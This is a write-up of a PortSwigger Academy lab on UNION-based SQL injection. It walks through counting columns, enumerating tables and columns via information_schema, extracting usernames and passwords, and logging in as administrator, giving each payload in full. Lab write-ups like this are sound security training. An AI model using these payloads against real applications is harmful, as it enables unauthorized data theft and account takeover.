# PortSwigger Lab – SQL Injection: Listing Database Contents

## Overview

**Topic:** SQL Injection  
**Goal:** Extract database information without brute forcing table names.  
**Platform:** PortSwigger Web Security Academy  

In this lab, we exploit a **SQL Injection vulnerability** to enumerate:

- Database tables
- Table columns
- Sensitive data (usernames and passwords)

Finally, we log in as the **administrator** using the extracted credentials.

---

# Step 1 – Identify the Injection Point

The website contains a product filter:

```
Refine your search → Gifts
```

The URL becomes:

```
/filter?category=Gifts
```

This indicates the backend query might look like:

```sql
SELECT name, description
FROM products
WHERE category = 'Gifts'
```

Since the `category` parameter is reflected in the SQL query, it may be vulnerable to **SQL Injection**.

---

# Step 2 – Find the Number of Columns

To perform a **UNION-based SQL injection**, we must determine how many columns are returned by the query.

Test with:

```
' UNION SELECT NULL--
```

If it fails, try adding more columns:

```
' UNION SELECT NULL,NULL--
```

If the page loads successfully, it means the original query returns **two columns**.

---

# Step 3 – List Database Tables

To enumerate database tables, we can query the **information schema**.

Payload:

```
' UNION SELECT table_name,NULL FROM information_schema.tables--
```

This returns a list of tables in the database.

Example result:

```
users_bgbxir
products
orders
categories
```

The interesting table appears to be:

```
users_bgbxir
```

---

# Step 4 – Discover Table Columns

Now we want to find the column names inside the `users_bgbxir` table.

We can query:

```
information_schema.columns
```

Payload:

```
' UNION SELECT column_name,NULL
FROM information_schema.columns
WHERE table_name='users_bgbxir'--
```

This reveals the columns:

```
username_mji
password_mvtazi
```

---

# Step 5 – Extract User Credentials

Now that we know:

- Table name
- Column names

We can extract the data.

Payload:

```
' UNION SELECT username_mji,password_mvtazi
FROM users_bgbxir--
```

This returns credentials such as:

```
administrator : xxxxxx
carlos : xxxxxx
wiener : xxxxxx
```

---

# Step 6 – Log in as Administrator

Using the extracted credentials:

```
Username: administrator
Password: <retrieved password>
```

Go to:

```
/my-account
```

Login successfully as the **administrator**.

The lab is now solved.

---

# Key Concepts Learned

## 1. SQL Injection

SQL Injection occurs when user input is directly included in SQL queries without proper sanitization.

Example vulnerable query:

```sql
SELECT * FROM users WHERE username = '$input'
```

---

## 2. UNION-Based SQL Injection

`UNION` allows combining results from multiple queries.

Example:

```sql
SELECT name FROM products
UNION
SELECT username FROM users
```

This can expose sensitive data.

---

## 3. Information Schema

Most databases contain metadata tables.

Important tables include:

| Table | Description |
|------|-------------|
| `information_schema.tables` | lists database tables |
| `information_schema.columns` | lists table columns |

---

# Attack Workflow

1. Identify injection point
2. Determine column count
3. Enumerate database tables
4. Enumerate table columns
5. Extract sensitive data
6. Use credentials to access admin account

---

# Tools Used

- Burp Suite
- Browser DevTools
- SQL knowledge

---

# Final Result

Successfully extracted administrator credentials and logged into the application.

Lab solved.
